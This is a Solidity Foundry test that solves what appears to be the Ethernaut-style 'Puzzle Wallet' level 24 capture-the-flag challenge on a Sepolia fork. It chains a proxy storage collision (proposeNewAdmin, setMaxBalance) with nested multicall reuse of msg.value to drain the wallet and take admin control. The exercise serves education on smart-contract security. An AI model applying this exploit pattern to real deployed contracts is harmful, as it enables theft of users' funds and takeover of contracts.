// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test, console} from "forge-std/Test.sol";
import {PuzzleProxy, PuzzleWallet} from "../src/level24/PuzzleWallet.sol";

contract level24 is Test {
    PuzzleProxy puzzleProxy =
        PuzzleProxy(payable(0xf84A3daEE1e0480AaEdbd266489BeECb9ff9B44f));
    PuzzleWallet puzzleWallet =
        PuzzleWallet(0xf84A3daEE1e0480AaEdbd266489BeECb9ff9B44f);

    function setUp() public {
        vm.createSelectFork(vm.rpcUrl("sepolia"));
    }

    function testlevel24Exploit() public {
        address user = 0xa659D686d7D696D496BeB0b781AB4734A4673294;
        vm.startPrank(user);

        console.log("admin: ", puzzleProxy.admin());

        puzzleProxy.proposeNewAdmin(user);
        puzzleWallet.addToWhitelist(user);

        bytes[] memory depositSelector = new bytes[](1);
        depositSelector[0] = abi.encodeWithSelector(
            puzzleWallet.deposit.selector
        );

        bytes[] memory data = new bytes[](2);
        data[0] = depositSelector[0];
        data[1] = abi.encodeWithSelector(
            puzzleWallet.multicall.selector,
            depositSelector
        );

        puzzleWallet.multicall{value: 0.001 ether}(data);
        puzzleWallet.execute(user, 0.002 ether, "0x");
        puzzleWallet.setMaxBalance(uint256(uint160(user)));

        console.log("admin: ", puzzleProxy.admin());
        vm.stopPrank();
    }
}
